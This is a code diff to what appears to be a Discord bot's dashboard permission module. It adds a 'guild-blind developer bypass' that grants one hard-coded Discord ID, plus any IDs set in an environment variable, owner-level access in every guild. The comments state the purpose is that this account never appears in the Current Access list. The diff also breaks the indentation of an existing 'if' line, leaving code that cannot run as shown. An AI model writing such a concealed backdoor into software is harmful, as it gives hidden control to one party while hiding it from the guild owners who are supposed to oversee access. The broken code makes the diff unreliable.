@@ -14,6 +14,13 @@ from utils.permissions import (
 
 
 async def _get_permission_level(guild_id: int, user_id: int) -> str | None:
+    # Guild-blind developer bypass — checked before touching
+    # dashboard_users at all, so the trusted developer never needs a
+    # row (and therefore never appears in Current Access) in any
+    # guild. See is_trusted_super_admin() below for the trust set.
+    if is_trusted_super_admin(user_id):
+        return LEVEL_OWNER
+
     async with aiosqlite.connect(DB_PATH) as db:
         cursor = await db.execute("""
             SELECT permission_level FROM dashboard_users
@@ -181,10 +188,42 @@ def require_bot_owner_api(f):
             user_id = int(user.get("id", 0))
         except (TypeError, ValueError):
             user_id = 0
-        if user_id not in _trusted_backup_user_ids():
+if user_id not in _trusted_backup_user_ids():
             return jsonify({
                 "success": False,
                 "error": "This action is restricted to the bot owner.",
             }), 403
         return f(*args, **kwargs)
     return decorated
+
+
+def _trusted_super_admin_user_ids() -> set[int]:
+    """
+    Guild-blind trust set for the developer bypass — grants full
+    LEVEL_OWNER access in every guild with no dashboard_users row
+    anywhere, so the developer never shows up in Current Access.
+    Same shape as _trusted_backup_user_ids() above, kept as its own
+    function since backup-trust and full-dashboard-trust are
+    different privilege scopes that won't always be the same people.
+    OWNER_DISCORD_ID (database.py — Dark's real Discord ID) is always
+    trusted. SUPER_ADMIN_USER_IDS (env var, comma-separated) can add
+    more without a code change.
+    """
+    ids = {OWNER_DISCORD_ID}
+    extra = os.getenv("SUPER_ADMIN_USER_IDS", "")
+    for part in extra.split(","):
+        part = part.strip()
+        if part.isdigit():
+            ids.add(int(part))
+    return ids
+
+
+def is_trusted_super_admin(user_id: int) -> bool:
+    """
+    Public check for callers outside this module (e.g.
+    dashboard/app.py's select_guild(), which needs to know "is this
+    the developer bypass account" before it has a guild_id to check
+    permissions against yet). _get_permission_level() above is the
+    other consumer of this trust set.
+    """
+    return user_id in _trusted_super_admin_user_ids()
